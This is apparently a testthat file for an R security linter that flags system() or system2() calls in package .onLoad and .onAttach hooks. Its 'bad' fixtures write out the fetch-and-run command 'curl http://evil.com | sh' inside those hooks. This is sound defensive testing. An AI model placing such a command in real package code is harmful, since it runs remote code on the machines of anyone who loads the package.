test_that("onload_calls_system_linter returns no lint correctly", {
  good1 = '
  .onLoad <- function(libname, pkgname) {
    packageStartupMessage()
  }
  '
  good2 = '
  .onAttach <- function(libname, pkgname) {
    packageStartupMessage()
  }
  '
  expect_no_lint(good1, lintrsecurity::onload_calls_system_linter())
  expect_no_lint(good2, lintrsecurity::onload_calls_system_linter())
})


test_that("onload_calls_system_linter returns lints correctly", {
  bad1 = '
  .onLoad <- function(libname, pkgname) {
    system("curl http://evil.com | sh")
  }
  '
  bad2 = '
  .onLoad <- function(libname, pkgname) {
    system2("curl", args = c("http://evil.com | sh"))
  }
  '
  bad3 = '
  .onAttach <- function(libname, pkgname) {
    system("curl http://evil.com | sh")
  }
  '
  bad4 = '
  .onAttach <- function(libname, pkgname) {
    system2("curl", args = c("http://evil.com | sh"))
  }
  '
  expect_lint(bad1, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(bad2, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(bad3, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
  expect_lint(bad4, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
    lintrsecurity::onload_calls_system_linter())
})

